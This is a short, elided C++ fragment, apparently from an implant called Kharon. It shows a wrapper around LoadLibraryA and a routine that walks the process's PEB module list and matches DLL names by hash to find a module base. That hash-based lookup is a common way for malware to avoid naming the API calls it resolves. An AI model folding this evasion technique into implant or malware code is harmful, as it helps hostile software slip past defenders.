...
auto DECLFN LdrLoad::Library(
    _In_ PCHAR LibName
) -> UPTR {
    return (UPTR)Root::Kharon().Krnl32.LoadLibraryA( LibName );
}
...
auto DECLFN LdrLoad::Module(
    ...
    RangeHeadList( NtCurrentPeb()->Ldr->InLoadOrderModuleList, PLDR_DATA_TABLE_ENTRY, {
        ...
        if ( Hsh::StrA<WCHAR>( Entry->BaseDllName.Buffer ) == LibHash ) {
            return reinterpret_cast<UPTR>( Entry->OriginalBase );
        }
     } )
